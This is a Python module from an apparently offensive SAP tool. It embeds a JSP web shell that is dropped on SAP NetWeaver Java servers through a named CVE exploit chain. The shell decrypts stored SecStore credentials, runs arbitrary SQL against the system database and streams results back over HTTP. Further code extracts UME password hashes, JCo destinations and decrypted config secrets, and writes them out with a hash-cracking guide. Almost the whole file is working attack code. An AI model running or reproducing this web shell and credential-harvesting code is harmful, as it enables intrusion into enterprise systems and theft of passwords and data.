#!/usr/bin/env python3
"""
SAP Java direct DB access via dropped JSP.

Reuses the SecStoreFS-decrypted `jdbc/pool/<SID>` credentials to open a
JDBC connection from inside the J2EE container, run a SELECT, and stream
results back over HTTP.  Two callers:

  - download_jdbc_query(node, query, max_rows) — generic SELECT runner
  - extract_password_hashes(node, max_users)   — UME_STRINGS j_user/j_password
                                                  pairs in a hashcat-friendly
                                                  format

The JSP is dropped via the same chunked-write helper used for the secstore
JSP; identical CVE-2025-31324 / GW-SAPXPG fallback chain.
"""

from __future__ import annotations

import base64
import csv
import io
import logging
import re
import ssl
import urllib.error
import urllib.parse
import urllib.request

logger = logging.getLogger(__name__)

_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
       "AppleWebKit/537.36 (KHTML, like Gecko)")


# ---------------------------------------------------------------------------
# JSP template — runs an arbitrary SELECT via the SecStoreFS-extracted
# jdbc/pool/<SID> credentials.  Result emitted as one CSV-encoded line per
# row, prefixed by a header line listing column names.
# ---------------------------------------------------------------------------
JDBC_QUERY_JSP = r'''<%@ page contentType="text/plain" %>
<%
String sid = request.getParameter("sid");
String b64query = request.getParameter("query");
String maxRowsS = request.getParameter("max_rows");
if (sid == null || sid.length() == 0 || b64query == null) {
    out.println("status=error"); out.println("error=missing-sid-or-query"); return;
}
sid = sid.toUpperCase();
String query = new String(java.util.Base64.getDecoder().decode(b64query), "UTF-8");
int maxRows = 500;
try { if (maxRowsS != null) maxRows = Integer.parseInt(maxRowsS); } catch (Exception e) {}

String pp = "/".equals(System.getProperty("file.separator"))
    ? "/usr/sap/" + sid + "/SYS/global/security/data/SecStore.properties"
    : "C:\\usr\\sap\\" + sid + "\\SYS\\global\\security\\data\\SecStore.properties";
String kp = "/".equals(System.getProperty("file.separator"))
    ? "/usr/sap/" + sid + "/SYS/global/security/data/SecStore.key"
    : "C:\\usr\\sap\\" + sid + "\\SYS\\global\\security\\data\\SecStore.key";

java.sql.Connection conn = null;
try {
    Class<?> SSF = Class.forName("com.sap.security.core.server.secstorefs.SecStoreFS");
    SSF.getMethod("setDefaultFilenames", String.class, String.class).invoke(null, pp, kp);
    try { SSF.getMethod("setSID", String.class).invoke(null, sid); } catch (Exception e) {}
    java.lang.reflect.Constructor<?> ctor = null;
    for (java.lang.reflect.Constructor<?> c : SSF.getDeclaredConstructors())
        if (c.getParameterTypes().length == 0) { ctor = c; ctor.setAccessible(true); break; }
    Object inst = ctor.newInstance();
    SSF.getMethod("setFilenames", String.class, String.class).invoke(inst, pp, kp);
    SSF.getMethod("openExistingStore").invoke(inst);
    java.util.Properties pairs = (java.util.Properties)
        SSF.getMethod("getStringPairs").invoke(inst);

    String jdbcVal = null;
    for (String n : pairs.stringPropertyNames()) {
        if (n.toLowerCase().startsWith("jdbc/pool/")) {
            jdbcVal = pairs.getProperty(n); break;
        }
    }
    if (jdbcVal == null) {
        out.println("status=error"); out.println("error=no-jdbc-pool-entry"); return;
    }
    String cleaned = jdbcVal.replace("\\", "");
    java.util.regex.Matcher m;
    m = java.util.regex.Pattern.compile("ClassName\\s*=\\s*([A-Za-z0-9_.]+)").matcher(cleaned);
    String drv = m.find() ? m.group(1) : null;
    m = java.util.regex.Pattern.compile("Url\\s*=\\s*(jdbc:[^&;]+)").matcher(cleaned);
    String url = m.find() ? m.group(1).trim() : null;
    m = java.util.regex.Pattern.compile("[?&;]User\\s*=\\s*([^&;]+)",
        java.util.regex.Pattern.CASE_INSENSITIVE).matcher(cleaned);
    String usr = m.find() ? m.group(1).trim() : null;
    m = java.util.regex.Pattern.compile("[?&;]Password\\s*=\\s*([^&;]*)",
        java.util.regex.Pattern.CASE_INSENSITIVE).matcher(cleaned);
    String pwd = m.find() ? m.group(1).trim() : "";

    if (drv != null) Class.forName(drv);
    conn = java.sql.DriverManager.getConnection(url, usr, pwd);
    java.sql.PreparedStatement ps = conn.prepareStatement(query);
    ps.setMaxRows(maxRows);
    java.sql.ResultSet rs = ps.executeQuery();
    java.sql.ResultSetMetaData md = rs.getMetaData();
    int n = md.getColumnCount();
    out.println("### COLUMNS");
    StringBuilder hdr = new StringBuilder();
    for (int i = 1; i <= n; i++) {
        if (i > 1) hdr.append(",");
        hdr.append(md.getColumnLabel(i));
    }
    out.println(hdr.toString());
    out.println("### ROWS");
    int rowCount = 0;
    while (rs.next() && rowCount < maxRows) {
        StringBuilder line = new StringBuilder();
        for (int i = 1; i <= n; i++) {
            if (i > 1) line.append("|");
            String v = rs.getString(i);
            if (v == null) v = "";
            // Replace pipes / newlines so the field-separator survives;
            // caller restores by base64-decoding each field.
            byte[] vb = v.getBytes("UTF-8");
            line.append(java.util.Base64.getEncoder().encodeToString(vb));
        }
        out.println(line.toString());
        rowCount++;
    }
    rs.close(); ps.close();
    out.println("### END row_count=" + rowCount);
} catch (Throwable t) {
    Throwable c = t;
    while (c.getCause() != null) c = c.getCause();
    out.println("status=error");
    out.println("error=" + c.getClass().getSimpleName() + ": " + c.getMessage());
} finally {
    if (conn != null) try { conn.close(); } catch (Exception e) {}
}
%>'''


# ---------------------------------------------------------------------------
# JSP invoker + parser
# ---------------------------------------------------------------------------

def invoke_jdbc_query(jsp_url: str, sid: str, query: str,
                       max_rows: int = 500, timeout: float = 60.0) -> dict:
    """POST a SELECT to the deployed JSP, return parsed rows.

    Returns dict {success, columns, rows, row_count, error, raw}.
    Each cell in `rows` is the raw UTF-8 string (already base64-decoded).
    """
    qb64 = base64.b64encode(query.encode("utf-8")).decode("ascii")
    body = urllib.parse.urlencode({
        "sid": sid, "query": qb64, "max_rows": str(max_rows)}).encode()
    ctx = ssl._create_unverified_context()
    req = urllib.request.Request(
        jsp_url, data=body,
        headers={"User-Agent": _UA,
                 "Content-Type": "application/x-www-form-urlencoded"})
    result = {"success": False, "columns": [], "rows": [],
              "row_count": 0, "error": "", "raw": ""}
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            text = r.read().decode("latin1", errors="replace")
    except urllib.error.HTTPError as e:
        try:
            text = e.read().decode("latin1", errors="replace")
        except Exception:
            text = ""
        result["error"] = f"HTTP {e.code}"
        result["raw"] = text[:500]
        return result
    except (urllib.error.URLError, TimeoutError, OSError) as e:
        result["error"] = str(e)
        return result

    result["raw"] = text
    section = None
    for line in text.splitlines():
        if line == "### COLUMNS": section = "cols"; continue
        if line == "### ROWS":    section = "rows"; continue
        if line.startswith("### END"):
            m = re.search(r"row_count=(\d+)", line)
            if m: result["row_count"] = int(m.group(1))
            section = None
            result["success"] = True
            continue
        if section is None:
            if line.startswith("error="):
                result["error"] = (result["error"] + " / " if result["error"]
                                    else "") + line[len("error="):]
            continue
        if section == "cols":
            result["columns"] = [c.strip() for c in line.split(",")]
        elif section == "rows":
            cells = []
            for b64 in line.split("|"):
                try:
                    cells.append(base64.b64decode(b64).decode("utf-8",
                                                                errors="replace"))
                except Exception:
                    cells.append("")
            result["rows"].append(cells)
    return result


# ---------------------------------------------------------------------------
# UME password hash extraction
# ---------------------------------------------------------------------------

# Direct query for UME password-hash rows.  NetWeaver kernels store the
# hash under different ATTR names depending on the UME version:
#   j_password              — NW 7.1+ (most common today)
#   hashvalue               — NW 7.00 / 7.01 SolMan-era UME
#   jSaltedHashedPassword   — transitional
#   hashed_pwd              — some CE / PI variants
# The LEFT JOIN on ATTR='j_user' resolves the human-readable username for
# kernels where PID is an opaque UID.  When j_user isn't present (older
# UME), COALESCE falls back to PID itself and parse_password_hashes strips
# the common "UACC.PRIVATE_DATASOURCE.un:" prefix client-side.
UME_HASH_QUERY = (
    "SELECT h.PID AS PID, "
    "       COALESCE(u.VAL, h.PID) AS USERNAME, "
    "       h.VAL AS HASH "
    "FROM UME_STRINGS h "
    "LEFT JOIN UME_STRINGS u "
    "       ON u.PID = h.PID AND UPPER(u.ATTR) = 'J_USER' "
    "WHERE UPPER(h.ATTR) IN ('J_PASSWORD', 'HASHVALUE', "
    "                        'JSALTEDHASHEDPASSWORD', 'HASHED_PWD')"
)

# Find every JCo destination by collecting cleartext property rows under
# any CID that has a `#~destination.name` entry.  All `#~*` keys come back
# as cleartext in VSTR; the password is in VBYTES (encrypted) and is
# decrypted via the SecStoreFS path elsewhere.
JCO_DESTINATIONS_QUERY = (
    "SELECT CID, NAME, VSTR FROM J2EE_CONFIGENTRY "
    "WHERE NAME LIKE '#~%' AND CID IN ("
    "  SELECT CID FROM J2EE_CONFIGENTRY WHERE NAME = '#~destination.name' "
    "  AND VSTR IS NOT NULL AND VSTR <> ''"
    ")"
)


def group_destinations(query_result: dict) -> list:
    """Convert the flat (CID, NAME, VSTR) result of JCO_DESTINATIONS_QUERY
    into a list of destination dicts, one per CID.

    Each dict has keys: cid, name, target_sid, ashost, sysnr, client, user,
    lang, gwhost, gwserv, type, auth_mode, conn_mode, plus any other
    `jco.client.*` properties keyed without the `#~` prefix.
    """
    cols = [c.upper() for c in query_result.get("columns", [])]
    try:
        ci, ni, vi = cols.index("CID"), cols.index("NAME"), cols.index("VSTR")
    except ValueError:
        return []
    by_cid = {}
    for row in query_result.get("rows", []):
        if len(row) <= max(ci, ni, vi):
            continue
        cid, name, vstr = row[ci], row[ni], row[vi]
        if not name.startswith("#~"):
            continue
        prop = name[2:]                          # strip the `#~` prefix
        bucket = by_cid.setdefault(cid, {"cid": cid, "_props": {}})
        bucket["_props"][prop] = vstr
    out = []
    for cid, bucket in by_cid.items():
        p = bucket["_props"]
        d = {
            "cid":         cid,
            "name":        p.get("destination.name", ""),
            "target_sid":  (p.get("jco.client.r3name", "") or "").upper(),
            "ashost":      p.get("jco.client.ashost", ""),
            "sysnr":       p.get("jco.client.sysnr", ""),
            "client":      p.get("jco.client.client", ""),
            "user":        p.get("jco.client.user", ""),
            "lang":        p.get("jco.client.lang", ""),
            "gwhost":      p.get("jco.client.gwhost", ""),
            "gwserv":      p.get("jco.client.gwserv", ""),
            "type":        p.get("jco.client.type", ""),
            "auth_mode":   p.get("AUTHENTICATION_MODE", ""),
            "conn_mode":   p.get("CONNECTION_MODE", ""),
            "pool_mode":   p.get("POOL_MODE", ""),
            "snc_mode":    p.get("jco.client.snc_mode", ""),
            "all_props":   p,
            "password":    "",   # filled in by caller from SecStore extract
        }
        if d["name"]:                 # ignore CIDs without a real destination
            out.append(d)
    return out


# J2EE_CONFIGENTRY rows whose NAME suggests a credential.  These are already
# decrypted by extract_java_secstore, but the password-extraction workflow
# needs them surfaced alongside the UME hashes so a single output file
# contains every recoverable secret on the system.
CONFIGENTRY_PASSWORD_QUERY = (
    "SELECT CID, NAME, VBYTES FROM J2EE_CONFIGENTRY "
    "WHERE VBYTES IS NOT NULL "
    "AND NAME NOT LIKE '##%' "
    "AND ("
    "  LOWER(NAME) LIKE '%pass%' OR LOWER(NAME) LIKE '%pwd%' OR "
    "  LOWER(NAME) LIKE '%secret%' OR LOWER(NAME) LIKE '%credential%' OR "
    "  LOWER(NAME) LIKE '%key%'"
    ")"
)


def parse_password_hashes(query_result: dict) -> list:
    """Convert a `download_jdbc_query` result into hash records.

    Returns list of dicts: {username, hash, algorithm, iterations, salt_b64}.
    """
    hashes = []
    cols = [c.upper() for c in query_result.get("columns", [])]
    # Two accepted shapes:
    #   1. (USERNAME, HASH)            — from older self-joined query
    #   2. (PID, VAL)                  — from `SELECT PID, VAL FROM
    #                                     UME_STRINGS WHERE ATTR LIKE
    #                                     '%j_password%'` — username is
    #                                     embedded in PID (last segment
    #                                     after the final colon)
    if "USERNAME" in cols and "HASH" in cols:
        u_idx, h_idx = cols.index("USERNAME"), cols.index("HASH")
        pid_idx = -1
    elif "PID" in cols and "VAL" in cols:
        pid_idx = cols.index("PID")
        h_idx   = cols.index("VAL")
        u_idx   = -1
    else:
        return hashes
    for row in query_result.get("rows", []):
        if len(row) <= max(h_idx, max(u_idx, pid_idx)):
            continue
        if pid_idx >= 0:
            pid = row[pid_idx] or ""
            # PID like "UACC.PRIVATE_DATASOURCE.un:Administrator"
            username = pid.rsplit(":", 1)[-1] if ":" in pid else pid
        else:
            username = row[u_idx] or ""
            # Older UME kernels store no j_user row; the query COALESCEs to
            # PID in that case, which looks like "UACC.PRIVATE_DATASOURCE.un:
            # <USERNAME>" or similar.  Strip the prefix so cracker output
            # stays human-readable.
            if ":" in username and (
                    "UACC" in username.upper()
                    or "PRIVATE_DATASOURCE" in username.upper()):
                username = username.rsplit(":", 1)[-1]
        full_hash = row[h_idx] or ""
        m = re.match(r"^\{([A-Za-z0-9\-]+)\s*,\s*(\d+)\s*,\s*(\d+)\}(.+)$",
                      full_hash.strip())
        if m:
            algorithm = m.group(1)
            iterations = int(m.group(2))
            salt_len = int(m.group(3))
            try:
                blob = base64.b64decode(m.group(4))
            except Exception:
                blob = b""
            # Digest sizes by algorithm tag.  NW 7.0x SolMan-era UME emits
            # `{SHA-1, N, L}...`; 7.3+ uses SHA-256; 7.5+ offers SHA-512.
            digest_size = {
                "SHA-1":   20,
                "SHA":     20,
                "SHA-256": 32,
                "SHA-512": 64,
            }.get(algorithm, 32)
            stored_hash = blob[:digest_size]
            salt = blob[digest_size:digest_size + salt_len]
            hashes.append({
                "username": username,
                "hash": full_hash,
                "algorithm": algorithm,
                "iterations": iterations,
                "salt_b64": base64.b64encode(salt).decode("ascii"),
                "hash_b64": base64.b64encode(stored_hash).decode("ascii"),
            })
        else:
            # Unrecognised format — surface as-is so the caller still sees
            # the username/hash pair.
            hashes.append({
                "username": username, "hash": full_hash,
                "algorithm": "unknown", "iterations": 0,
                "salt_b64": "", "hash_b64": "",
            })
    return hashes


def hashes_to_text(hashes: list, configentry_secrets: list = None) -> str:
    """Render hash records + cleartext config-entry secrets as one text file.

    Includes a self-contained cracking guide as a header comment block, since
    SAP UME's iteration recipe (SHA-N(pwd + prev_digest)) doesn't match any
    standard hashcat or JtR mode.
    """
    lines = [
        "# SAP Java password material",
        "# =================================================================",
        "#",
        "# Section 1: UME user hashes (UME_STRINGS j_password rows)",
        "# Format: username:{ALGORITHM, ITERATIONS, SALT_LEN}base64(hash || salt)",
        "# Algorithm:",
        "#   digest = SHA-N(password + salt)",
        "#   for i in range(iterations - 1):",
        "#       digest = SHA-N(password + digest)",
        "#   stored = base64(digest || salt)",
        "#",
        "# >>> Cracking with hashcat <<<",
        "#",
        "# SAP UME's iteration is SHA-N(password + prev_digest), NOT the",
        "# common SHA(salt + prev_digest) PBE variant — so no built-in",
        "# hashcat mode (-m) matches.  You have two options:",
        "#",
        "#   Option A — hashcat with a generic-hash custom kernel.",
        "#     Use the OpenCL `--brain` + custom `--hash-type 99999` kernel,",
        "#     OR use hashcat's built-in `-m 1430` (sha256(pass)) as a",
        "#     starting template and patch the iteration loop to append",
        "#     password+digest each round.  Reference algorithm in",
        "#     sap_java_secstore.py::ume_password_hash().",
        "#",
        "#   Option B (recommended) — wordlist attack with the bundled Python helper:",
        "#     # crack_java_hashes.py  (small wrapper around sap_java_secstore)",
        "#     from sap_java_secstore import ume_password_check",
        "#     hashes = [(user, hash) for line in open('hashes_java_<SID>_<ts>.txt')",
        "#               for (user, hash) in [line.split(':', 1)]",
        "#               if not line.startswith('#')]",
        "#     for word in open('wordlist.txt'):",
        "#         w = word.strip()",
        "#         for u, h in hashes:",
        "#             if ume_password_check(h, w):",
        "#                 print(f'CRACKED {u}:{w}')",
        "#",
        "#   Option C — John the Ripper (saph-sha256 dynamic format).",
        "#     JtR ships a saph-sha256 plugin but it implements the salt",
        "#     iteration variant, not SAP UME's pwd iteration variant.  You",
        "#     would need to add a small dynamic format expression that",
        "#     matches the algorithm above.  See JtR's `dynamic_compiler.c`",
        "#     and the SAP_H plug-in for reference.",
        "#",
        "# >>> Tip: Section 2 below already gives you cleartext passwords for <<<",
        "# >>> mail / JCo / SDIC / ws.* services without any cracking needed. <<<",
        "#",
        "",
    ]
    if hashes:
        for h in hashes:
            lines.append(f"{h['username']}:{h['hash']}")
    else:
        lines.append("# (no UME hashes recovered)")
    lines.append("")
    if configentry_secrets:
        lines.append("# Section 2: cleartext password-like entries from "
                      "J2EE_CONFIGENTRY")
        lines.append("# Format: cid::name=value   (already decrypted via SecStoreFS)")
        lines.append("")
        for s in configentry_secrets:
            v = s.get("value", "")
            # Single-line presentation; keep newlines visible as \n
            v = v.replace("\\", "\\\\").replace("\n", "\\n")
            lines.append(f"{s.get('cid', '')}::{s.get('name', '')}={v}")
    return "\n".join(lines) + "\n"
